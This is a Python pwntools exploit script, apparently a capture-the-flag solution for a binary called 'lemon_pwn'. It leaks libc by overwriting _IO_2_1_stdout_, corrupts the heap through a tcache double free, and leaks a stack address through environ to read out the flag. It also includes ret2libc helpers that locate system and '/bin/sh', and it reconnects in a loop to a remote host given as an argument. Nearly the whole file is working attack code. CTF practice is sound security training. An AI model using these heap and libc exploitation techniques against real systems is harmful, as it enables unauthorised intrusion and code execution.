#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/07 10:35:35
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess, warnings, os

arglen = len(sys.argv)
warnings.filterwarnings('ignore')
def ret2libc(leak,func,binary=null):
    libc    = LibcSearcher(func,leak)       if binary == null else binary
    base    = leak-libc.dump(func)          if binary == null else leak-libc.sym[func]
    system  = base+libc.dump('system')      if binary == null else base+libc.sym['system']
    binsh   = base+libc.dump('str_bin_sh')  if binary == null else next(libc.search(b'/bin/sh'))
    return  (system,binsh)
def hack(pwn):
    global io,binary,libc
    times = 0
    while True:
        try:
            times += 1
            clear()
            info(f'time ================> {times}')
            pwn()
        except:
            io.close()
            io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))
s           =       lambda data             : io.send(data)
sa          =       lambda rv,data          : io.sendafter(rv,data)
sl          =       lambda data             : io.sendline(data)
sla         =       lambda rv,data          : io.sendlineafter(rv,data)
r           =       lambda num              : io.recv(num)
rl          =       lambda keepends=True    : io.recvline(keepends)
ru          =       lambda data,drop=True   : io.recvuntil(data,drop)
ia          =       lambda                  : io.interactive()
uu32        =       lambda data             : u32(data.ljust(4,b'\x00'))
uu64        =       lambda data             : u64(data.ljust(8,b'\x00'))
i16         =       lambda data             : int(data,16)
leak        =       lambda name,addr        : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
info        =       lambda data             : log.info(f'\033[36m{data}\033[0m')
dbg         =       lambda point=null       : (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og          =       lambda binary           : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg          =       lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc     =       lambda leak,func        : leak - libc.sym[func]
libcpath    =       lambda binary           : subprocess.check_output(['ldd',binary]).decode().replace('	', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
proc        =       lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
clear       =       lambda                  : os.system('clear')

# context.log_level='debug'
context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
DEBUG = 1
GLIBC = 1
binary = './lemon_pwn'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(idx):
    sla(">>>",str(idx))

def add(index,name,size,content,flag=True):
    cmd(1)
    sla("Input the index of your lemon: ",str(index))
    sa("Now, name your lemon: ",name)
    sla("Input the length of message for you lemon: ",str(size))
    if flag:
        sa("Leave your message: ",content)

def show(index):
    cmd(2)
    sla("Input the index of your lemon : ",str(index))

def free(index):
    cmd(3)
    sla("Input the index of your lemon : ",str(index))

def edit(index,content):
    sleep(1)
    cmd(4)
    sla(":",str(index))
    ru("Now it's your time to draw and color!")
    s(content)

def pwn():
    info("flag to stack")
    sla("game with me?","yes")
    sla("number:","1111")
    sla("first:","woodwhale")
    ru("0x")
    stack_offset = i16(r(3))
    leak("stack_offset",stack_offset)

    info("IO_stdout leak libc")
    add(0,p64(0)+p64(0x31),0x10,p64(0)+p64(0x31))
    edit(-0x10c,p64(0xfbad3887)+p64(0)*3+p8(0))     # io_stdout leak libc
    libc.address = uu64(ru(b"\x7f",False)[-6:])-(0x7f28418aa3e0-0x7f28414d3000)
    leak("base",libc.address)
    ru("1. Get a lemon")
    
    info("tcache double free")
    add(0,p64(0)+p64(0x31),0x500,null,False)
    free(0)

    add(1,p8(0xc0),0x100,"aaa")
    # dbg()
    add(1,p64(0)+p64(0x30),0x100,"aaa")
    # dbg()
    show(1)
    sleep(0.1)
    ru("eat eat eat ")
    heap_addr = int(r(5),10)
    leak("heap_addr",heap_addr)

    # dbg()
    add(2,p64(libc.sym["__free_hook"])+p16(heap_addr-0x2b0+0x10),0x100,"aaa")
    free(1)
    # dbg()
    add(3,'3',0x240,
        p64(0x0000020000000000)+p64(0)*3+p64(0x0000000001000000)+
        p64(0)*5+p64(libc.sym["_IO_2_1_stdout_"]-0x33)*10 
    )
    # dbg()
    add(0,"0",0x60,
        b"a"*(0x33-0x10)+p64(0x71)*2+
        p64(0xfbad1887)+p64(0)*3+p64(libc.sym["environ"])+p64(libc.sym["environ"]+0x10)[0:5]
    )
    # dbg()
    stack = uu64(ru("\x7f",False)[-6:])
    leak("stack_info",stack)
    # dbg()
    free(3)
    add(3,'3',0x240,
        p64(0x0000020000000000)+p64(0)*3+p64(0x0000000001000000)+
        p64(0)*5+p64(libc.sym["_IO_2_1_stdout_"]-0x33)*10 
    )
    add(0,"0",0x60,
        b"a"*(0x33-0x10)+p64(0x71)*2+
        p64(0xfbad1887)+p64(0)*3+p64(stack-0x188)+p64(stack-0x178)[:5]
    )
    ru("\n")
    flag = ru("}",False)
    info(f"{flag}")
    ia()
    
hack(pwn)



